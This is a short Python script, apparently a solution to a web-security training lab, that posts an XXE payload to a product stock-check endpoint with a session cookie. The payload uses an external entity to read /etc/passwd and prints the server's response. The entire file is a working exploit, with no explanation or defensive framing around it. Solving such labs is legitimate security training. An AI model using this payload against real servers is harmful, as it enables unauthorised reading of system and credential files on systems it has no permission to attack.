import requests

url = "https://0aec0009038f17f7c0972daf00d2006f.web-security-academy.net/product/stock"

cookies = {
	"session": "mWpqw6FnsLRKyxjXTS0Uw7nqTv9tEOSQ"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>"""

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)